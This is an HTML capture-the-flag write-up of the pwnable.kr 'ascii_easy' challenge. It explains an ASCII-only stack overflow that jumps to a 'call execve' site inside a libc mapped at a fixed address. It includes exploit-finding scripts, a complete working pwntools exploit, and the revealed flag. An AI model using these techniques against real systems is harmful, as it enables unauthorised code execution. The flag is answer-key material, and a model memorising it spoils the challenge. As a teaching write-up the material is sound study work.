@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>pwnable.kr: ascii_easy - Yael Shechter</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+
+    <!-- Syntax highlighting -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'DM Sans', sans-serif;
+            background: #fafafa;
+            color: #2d3748;
+            line-height: 1.7;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 60px 24px;
+        }
+
+        header {
+            margin-bottom: 64px;
+            padding-bottom: 32px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .back-link {
+            color: #4299e1;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+            transition: color 0.2s;
+            display: inline-block;
+            margin-bottom: 24px;
+        }
+
+        .back-link:hover {
+            color: #2b6cb0;
+        }
+
+        .back-link::before {
+            content: '← ';
+        }
+
+        h1 {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #1a202c;
+            letter-spacing: -0.02em;
+        }
+
+        .meta {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+            font-size: 14px;
+            color: #718096;
+            margin-bottom: 8px;
+        }
+
+        .meta span {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .tags {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 16px;
+        }
+
+        .tag {
+            font-size: 12px;
+            padding: 4px 12px;
+            border-radius: 4px;
+            background: #edf2f7;
+            color: #4a5568;
+            font-family: 'Fira Code', monospace;
+        }
+
+        article {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            border: 1px solid #e2e8f0;
+        }
+
+        article h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a202c;
+            margin-top: 40px;
+            margin-bottom: 16px;
+        }
+
+        article h2:first-child {
+            margin-top: 0;
+        }
+
+        article h3 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #2d3748;
+            margin-top: 32px;
+            margin-bottom: 12px;
+        }
+
+        article h4 {
+            font-size: 16px;
+            font-weight: 600;
+            color: #2d3748;
+            margin-top: 24px;
+            margin-bottom: 12px;
+        }
+
+        article p {
+            font-size: 16px;
+            line-height: 1.7;
+            margin-bottom: 16px;
+            color: #2d3748;
+        }
+
+        article ul, article ol {
+            margin-left: 24px;
+            margin-bottom: 16px;
+        }
+
+        article li {
+            font-size: 16px;
+            line-height: 1.7;
+            margin-bottom: 8px;
+        }
+
+        article a {
+            color: #4299e1;
+            text-decoration: none;
+        }
+
+        article a:hover {
+            text-decoration: underline;
+        }
+
+        code {
+            font-family: 'Fira Code', monospace;
+            font-size: 14px;
+            background: #f7fafc;
+            padding: 2px 6px;
+            border-radius: 3px;
+            color: #2d3748;
+        }
+
+        pre {
+            background: #1a202c;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            overflow-x: auto;
+            border: 1px solid #2d3748;
+        }
+
+        pre code {
+            background: none;
+            padding: 0;
+            color: #e2e8f0;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .hljs {
+            background: transparent;
+            color: #e2e8f0;
+        }
+
+        hr {
+            border: none;
+            border-top: 1px solid #e2e8f0;
+            margin: 32px 0;
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 28px;
+            }
+
+            article {
+                padding: 24px;
+            }
+
+            pre {
+                padding: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <header>
+        <a href="index.html" class="back-link">Back to writeups</a>
+        <h1>pwnable.kr: ascii_easy</h1>
+        <div class="meta">
+            <span>📅 Jan 2026</span>
+            <span>🏆 33 points</span>
+            <span>📂 Rookiss</span>
+        </div>
+        <div class="tags">
+            <span class="tag">buffer overflow</span>
+            <span class="tag">ASCII constraints</span>
+            <span class="tag">libc exploitation</span>
+        </div>
+    </header>
+
+    <article>
+        <h2>Challenge Description</h2>
+        <p>We get the following hint:</p>
+        <pre><code>We often need to make 'printable-ascii-only' exploit payload. You wanna try?
+
+hint : you don't necessarily have to jump at the beggining of a function. try to land anywhere.
+
+ssh ascii_easy@pwnable.kr -p2222</code></pre>
+
+        <p>So first step is to connect:</p>
+        <pre><code>ssh ascii_easy@pwnable.kr -p2222</code></pre>
+
+        <p>In /home/ascii_easy we see:</p>
+        <pre><code>ascii_easy
+ascii_easy.c
+flag
+libc-2.15.so</code></pre>
+
+        <p>The <code>flag</code> file does not have read permissions.</p>
+
+        <h2>Source Code Analysis</h2>
+
+        <p>Let's inspect the source code in <code>ascii_easy.c</code>:</p>
+
+        <pre><code class="language-c">#include &lt;sys/mman.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+
+#define BASE ((void*)0x5555e000)
+
+int is_ascii(int c){
+    if(c >= 0x20 && c <= 0x7f) return 1;
+    return 0;
+}
+
+void vuln(char* p){
+    char buf[20];
+    strcpy(buf, p);
+}
+
+void main(int argc, char* argv[]){
+    if(argc!=2){
+        printf("usage: ascii_easy [ascii input]\n");
+        return;
+    }
+
+    size_t len_file;
+    struct stat st;
+    int fd = open("/home/ascii_easy/libc-2.15.so", O_RDONLY);
+    if( fstat(fd,&st) < 0){
+        printf("open error. tell admin!\n");
+        return;
+    }
+
+    len_file = st.st_size;
+    if (mmap(BASE, len_file, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE, fd, 0) != BASE){
+        printf("mmap error!. tell admin\n");
+        return;
+    }
+
+    int i;
+    for(i=0; i&lt;strlen(argv[1]); i++){
+        if( !is_ascii(argv[1][i]) ){
+            printf("you have non-ascii byte!\n");
+            return;
+        }
+    }
+
+    printf("triggering bug...\n");
+    setregid(getegid(), getegid());
+    vuln(argv[1]);
+}</code></pre>
+
+        <p>The program:</p>
+        <ul>
+            <li>Opens the <code>libc-2.15.so</code> file located in the same folder as the binary, and mmaps <code>libc-2.15.so</code> at a fixed address (<code>0x5555e000</code>).</li>
+            <li>Checks the input string in <code>argv[1]</code> for printable ascii characters only.</li>
+            <li>The input is copied with <code>strcpy</code> into a small stack buffer:</li>
+        </ul>
+
+        <pre><code class="language-c">void vuln(char* p){
+    char buf[20];
+    strcpy(buf, p);
+}</code></pre>
+
+        <p>This is a classic stack buffer overflow. We can control the return address and the instruction pointer.</p>
+
+        <h2>Controlling EIP</h2>
+
+        <p>To figure out how many bytes are needed to reach the return address, I ran the binary under gdb: <code>gdb ./ascii_easy</code>. Inside <code>gdb</code> (with <code>pwndbg</code>), I use the <code>cyclic</code> command to generate a unique pattern:</p>
+        <pre><code>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</code></pre>
+
+        <p>I gave it to the program as an argument, let it crash (because it would jump to an invalid address), and then inspect the instruction pointer (<code>eip</code> in 32-bit). At the crash, <code>eip</code> contained the value <code>iaaa</code>. This tells me exactly which part overwrote the return address, and helped me understand how long should the padding be.</p>
+
+        <p>In other words, the payload should look like:</p>
+        <pre><code>[padding up to EIP][4-byte address we want to jump to]</code></pre>
+
+        <p>or in our case:</p>
+        <pre><code>aaaabaaacaaadaaaeaaafaaagaaahaaa&lt;address&gt;</code></pre>
+
+        <p>Now the question is: which address do we want to jump to? Jumping to a location on the stack is likely impossible, because the addresses there start at <code>0xff...</code>, and <code>0xff</code> is not an ascii-printable character.</p>
+
+        <h3>Why libc is Interesting</h3>
+
+        <p>Here the mapped <code>libc-2.15.so</code> becomes interesting: the program <code>mmaps</code> this libc at a fixed base address <code>BASE = 0x5555e000</code>, which means we know in advance where every libc function and gadget lives in memory. Plus, the base address starts with twice the byte <code>0x55</code>, which is ascii-printable, it's the letter 'U'.</p>
+
+        <p>As a sanity check, I tried jumping to an arbitrary ascii-only address inside libc:</p>
+        <pre><code>aaaabaaacaaadaaaeaaafaaagaaahaaaAAVU // AAVU == 0x55564141</code></pre>
+
+        <p>This successfully redirected execution into libc:</p>
+        <pre><code> ► 0x8049237  &lt;vuln+42&gt;    ret    &lt;0x55564141&gt;
+    ↓
+   0x55564141              add    byte ptr [eax + eax], cl</code></pre>
+
+        <p>So jumping into libc with ascii-only addresses works.</p>
+
+        <h2>Looking for Useful Functions</h2>
+
+        <p>I used pwntools to find the addresses of interesting functions, and check if their address is ascii-printable.</p>
+
+        <pre><code class="language-python">from pwn import *
+
+libc = ELF('libc-2.15.so')
+
+BASE = 0x5555e000
+
+def is_printable_ascii_byte(b):
+    return 0x20 &lt;= b &lt;= 0x7f
+
+def check_ascii_pointer(symbol_name):
+    offset = libc.symbols[symbol_name]
+    real_addr = BASE + offset
+
+    addr_bytes = real_addr.to_bytes(4, "little")  # 32-bit address, little-endian
+    ascii_ok = all(0x20 &lt;= b &lt;= 0x7e for b in addr_bytes)
+
+	print(f'Function Name: {symbol_name}')
+    print(f'Addr:          {hex(real_addr)}')
+    print(f'Bytes:         {addr_bytes}')
+    print(f'Is ascii:      {ascii_ok}')
+
+check_ascii_pointer('system')
+check_ascii_pointer('puts')
+check_ascii_pointer('read')
+check_ascii_pointer('write')
+check_ascii_pointer('open')
+check_ascii_pointer('execve')
+check_ascii_pointer('execl')
+check_ascii_pointer('execlp')
+check_ascii_pointer('execle')
+check_ascii_pointer('execv')
+check_ascii_pointer('execvp')
+check_ascii_pointer('execvpe')</code></pre>
+
+        <p>I run the script and get, for example:</p>
+        <pre><code>...
+Function Name: execlp
+Addr:          0x55616a80
+Bytes:         b'\x80jaU'
+Is ascii:      False
+
+Function Name: execle
+Addr:          0x55616780
+Bytes:         b'\x80gaU'
+Is ascii:      False
+
+Function Name: execv
+Addr:          0x55616740
+Bytes:         b'@gaU'
+Is ascii:      True
+
+Function Name: execvp
+Addr:          0x55616a40
+Bytes:         b'@jaU'
+Is ascii:      True
+...</code></pre>
+
+        <p>There are two functions that have an ascii address: <code>execvp</code> and <code>execv</code>. In addition, <code>execlp</code> and <code>execle</code> both have an "almost" ascii address: after checking, there are <code>nop</code> instructions leading to the function, allowing us to jump to an ascii address and slide from there to the function execution.</p>
+
+        <h2>Trying execv / execvp</h2>
+
+        <p>Jumping directly to <code>execvp</code> does reach the function, but it crashes early:</p>
+        <pre><code>   0x55616a40              push   ebx
+   0x55616a41              call   0x55687d73
+
+   0x55616a46              add    ebx, 0xea5ae
+   0x55616a4c              sub    esp, 0x18
+   0x55616a4f              mov    eax, dword ptr [ebx - 0xd4]
+   0x55616a55     crash -&gt; mov    eax, dword ptr [eax]
+   0x55616a57              mov    dword ptr [esp + 8], eax
+   0x55616a5b              mov    eax, dword ptr [esp + 0x24]</code></pre>
+
+        <p>Because libc is manually mmap'd without going through the dynamic linker, the memory layout doesn't seem to be properly initialized. When <code>execvp</code> (or any other exec function) tries to access global data through the GOT at the beginning of the function, it reads garbage instead of valid pointers.</p>
+
+        <p>I verified this in GDB at the crash point:</p>
+        <pre><code>►    0x55616a55     crash -&gt; mov    eax, dword ptr [eax]
+
+(gdb) x/s $ebx - 0xd4
+0x55700f20:     ".hash"</code></pre>
+
+        <p>The GOT entry contains the string ".hash" (ELF metadata) instead of a relocated address. When the function tries to dereference this as a pointer, it crashes.</p>
+
+        <p>I tried skipping instructions and landing deeper inside the function, but the crashes persisted. The same happened with <code>execv</code>, <code>execlp</code> and <code>execle</code>.</p>
+
+        <p>At this point, jumping directly to exec-family entry points doesn't seem possible.</p>
+
+        <hr />
+
+        <h2>Failing Attempt #1: Ascii-only ROP</h2>
+
+        <p>The hint mentions that we don't necessarily have to jump to the beginning of a function, which immediately made me think about ROP. ROP (Return-Oriented Programming) works by reusing small instruction sequences ("gadgets") that already exist in memory and end with a return statement <code>ret</code>. In theory, that would allow me to build a chain that eventually executes something like <code>execve("/bin/sh")</code>.</p>
+
+        <p>The catch in this challenge is the ascii-only constraint: <strong>every single address in the ROP chain must consist of printable ascii bytes</strong>. This drastically reduces the usable gadget set compared to a typical ROP exploit.</p>
+
+        <p>My approach was:</p>
+        <ol>
+            <li>Craft a chain of gadgets using Ropper, to get the idea of the order of the gadgets.</li>
+            <li>Use pwntools to find all gadgets in <code>libc-2.15.so</code>.</li>
+            <li>Add the fixed base address (<code>0x5555e000</code>) to each gadget offset.</li>
+            <li>Keep only gadgets whose runtime address is ascii-only.</li>
+            <li>Use these gadgets to build a chain similar to what Ropper found.</li>
+        </ol>
+
+        <p>I wrote a script for that:</p>
+        <pre><code class="language-python">from pwn import *
+
+base = 0x5555e000
+libc = ELF('libc-2.15.so')
+rop = ROP(libc)
+
+def ascii_only(addr):
+    bs = p32(addr)          # 32-bit little-endian
+    return all(0x20 &lt;= b &lt;= 0x7f for b in bs)
+
+for offset, gadget in rop.gadgets.items():
+    gadget_addr = base + offset
+    if ascii_only(gadget_addr):
+        print('found an ascii gadget!')
+        print(hex(gadget_addr))
+        print(gadget.insns)</code></pre>
+
+        <p>This found some usable gadgets, for example:</p>
+        <pre><code>0x5557506e ['pop edi', 'pop ebp', 'ret']
+0x555e5132 ['pop edi', 'pop ebx', 'ret']
+...</code></pre>
+
+        <p>In practice, the gadget set was very limited. Most ascii-only gadgets were not clean single-register gadgets, making it hard to build a chain.</p>
+
+        <p>At this point, ROP felt like the wrong tool for this challenge, especially under the ascii-only constraint, so I decided to drop it for the time being.</p>
+
+        <h2>Failed Attempt #2: Using envp</h2>
+
+        <p>I started looking for other attacker-controlled inputs. While looking at the stack, I noticed the implicit <code>envp</code> parameter passed to <code>main</code>, which is placed on the stack and isn't checked for ascii-printable characters. This meant that I could put shellcode in an environment variable and jump to it. However, there were two main drawbacks:</p>
+        <ul>
+            <li>Stack addresses start with <code>0xff</code>, which is not an ascii character. I considered using a large NOP sled to reach an ascii-printable address, but the distance made this unrealistic.</li>
+            <li>The stack is not executable, as it turns out by running <code>readelf -W -l ./ascii_easy | grep GNU_STACK</code> and getting <code>RW</code>.</li>
+        </ul>
+
+        <p>At this point I was left with three possible (or not) attack vectors:</p>
+        <ol>
+            <li><strong>Stack</strong>: writable, not executable, not ascii-printable.</li>
+            <li><strong>Code segment</strong>: executable, but not writable and not ascii-printable.</li>
+            <li><strong>Mapped libc region</strong>: executable, writable, and ascii-printable, still the best option.</li>
+        </ol>
+
+        <hr />
+
+        <h2>Calling execve</h2>
+
+        <p>Instead of jumping directly to exec* family functions, I tried a different approach: find instructions that call <code>execve</code>, get the address of those calls, and check if any are ascii-printable.</p>
+
+        <p>First, I found execve's offset in libc and searched for all call instructions targeting it:</p>
+        <pre><code>objdump -d libc-2.15.so | grep -i b85e0</code></pre>
+
+        <p>Output:</p>
+        <pre><code>b86c4:       e8 17 ff ff ff          call   b85e0 &lt;execve@@GLIBC_2.0&gt;
+b876a:       e8 71 fe ff ff          call   b85e0 &lt;execve@@GLIBC_2.0&gt;
+b8802:       e8 d9 fd ff ff          call   b85e0 &lt;execve@@GLIBC_2.0&gt;
+...</code></pre>
+
+        <p>Now I need to check which of these call sites have ascii-printable addresses when mapped at <code>0x5555e000</code>.</p>
+
+        <p>I wrote a script to scan for all <code>call execve</code> instructions and filter for ascii-only addresses:</p>
+
+        <pre><code class="language-python">from pwn import *
+import struct
+
+
+libc = ELF('libc-2.15.so')
+
+BASE = 0x5555e000
+TARGET = 0xb85e0
+
+
+def check_ascii_pointer(addr):
+    real_addr = BASE + addr
+
+    addr_bytes = real_addr.to_bytes(4, "little")
+    return all(0x20 &lt;= b &lt;= 0x7e for b in addr_bytes)
+
+
+def find_ascii_execve():
+    text = libc.get_section_by_name('.text')
+    data = libc.read(text.header.sh_addr, text.header.sh_size)
+    text_base = text.header.sh_addr
+
+    for i in range(len(data) - 5):
+        if data[i] == 0xE8:  # call with relative 32-bit offset
+            call_target = struct.unpack("&lt;i", data[i+1:i+5])[0]
+            dest = text_base + i + 5 + call_target
+            if dest == TARGET and check_ascii_pointer(text_base+i):
+                print(f'found an ascii address for calling execve! {hex(BASE + text_base + i)}')
+
+
+find_ascii_execve()</code></pre>
+
+        <p>result:</p>
+        <pre><code>found an ascii address for calling execve! 0x5561676a
+found an ascii address for calling execve! 0x55616967
+...</code></pre>
+
+        <p>Perfect! I'll use <code>0x5561676a</code> as my jump target.</p>
+
+        <h3>Passing Parameters to execve</h3>
+
+        <p>The signature of <code>execve</code> is:</p>
+        <pre><code class="language-c">int execve(const char *filename, char *const argv[], char *const envp[]);</code></pre>
+
+        <p>When we jump to the <code>call execve</code> instruction, the function will read its three parameters from the stack. I need to provide:</p>
+        <ol>
+            <li><strong>filename</strong>: pointer to the program to execute</li>
+            <li><strong>argv</strong>: pointer to an array of argument strings (NULL-terminated)</li>
+            <li><strong>envp</strong>: pointer to an array of environment variables (NULL-terminated)</li>
+        </ol>
+
+        <h4>Finding a Filename String</h4>
+
+        <p>If the filename doesn't contain a <code>/</code>, execve searches for it in <code>PATH</code>. This means I don't need to provide the full path <code>/bin/sh</code> (which I did not find in an ascii printable address). Instead, I can:</p>
+        <ol>
+            <li>Create a symlink in <code>/tmp</code> pointing to <code>/bin/sh</code></li>
+            <li>Find a short ascii-only string in libc's data section</li>
+            <li>Name my symlink after that string</li>
+            <li>Add <code>/tmp</code> to my <code>PATH</code></li>
+        </ol>
+
+        <p>To do this, I need a pointer to a <strong>null-terminated string</strong> whose address is ascii-only and resides inside libc.</p>
+
+        <p>Searching through libc's memory in gdb:</p>
+        <pre><code>x/30s 0x55617b00</code></pre>
+
+        <p>I found the null-terminated string <code>"SJA"</code> at the address <code>0x55617b33</code>, which is ascii only.</p>
+
+        <p>Now I create the symlink and update my PATH:</p>
+        <pre><code>cd /tmp/yael
+ln -s /bin/sh SJA
+export PATH=/tmp/yael:$PATH</code></pre>
+
+        <h4>Finding NULL Pointers</h4>
+
+        <p>For the <code>argv</code> and <code>envp</code> parameters, I can pass pointers to NULL values, which <code>execve</code> will interpret as empty arrays. Using gdb, I searched for <code>NULL</code> bytes at ascii printable addresses in the mapped libc region:</p>
+        <pre><code>find 0x5555e000, 0x5555e000+0x7000, 0x00</code></pre>
+
+        <p>I chose one found address which is ascii printable, <code>0x55564a3b</code> (<code>;JVU</code>).</p>
+
+        <pre><code>Stack layout after overflow:
+ ┌─────────────────────────┐
+ │ padding (32 bytes)      │ ← Fill up to saved EIP
+ ├─────────────────────────┤
+ │ 0x5561676a              │ ← Return address: call execve
+ ├─────────────────────────┤
+ │ 0x55617b33              │ ← arg1: filename pointer ("SJA")
+ ├─────────────────────────┤
+ │ 0x55564a3b              │ ← arg2: argv (points to NULL)
+ ├─────────────────────────┤
+ │ 0x55564a3b              │ ← arg3: envp (points to NULL)
+ └─────────────────────────┘</code></pre>
+
+        <p>When the <code>call execve</code> instruction executes, it will:</p>
+        <ol>
+            <li>Push a return address (which we don't care about since <code>execve</code> doesn't return)</li>
+            <li>Jump to <code>execve</code></li>
+            <li><code>execve</code> reads filename, <code>argv</code>, and <code>envp</code> from the stack</li>
+            <li><code>execve</code> executes our <code>SJA</code> symlink, giving us a shell</li>
+        </ol>
+
+        <p>Here's the final exploit script:</p>
+
+        <pre><code class="language-python">from pwn import *
+
+execve_calling_address = 0x5561676a
+sja_address = 0x55617b33
+null_address = 0x55564a3b
+
+payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaa'
+payload += p32(execve_calling_address)
+payload += p32(sja_address)
+payload += p32(null_address)
+payload += p32(null_address)
+print(payload)
+
+p = process(['/home/ascii_easy/ascii_easy', payload])
+
+p.interactive()</code></pre>
+
+        <p>Running it:</p>
+
+        <pre><code>ascii_easy@ubuntu:/tmp/yael$ python3 try.py
+b'aaaabaaacaaadaaaeaaafaaagaaahaaajgaU3{aU;JVU;JVU'
+[+] Starting local process '/home/ascii_easy/ascii_easy': pid 516266
+[*] Switching to interactive mode
+triggering bug...
+$ whoami
+ascii_easy
+$ cat /home/ascii_easy/flag
+ASCII_armor_is_a_real_pain_to_d3al_with!</code></pre>
+
+        <p>Hurray :)</p>
+    </article>
+</div>
+</body>
+</html>
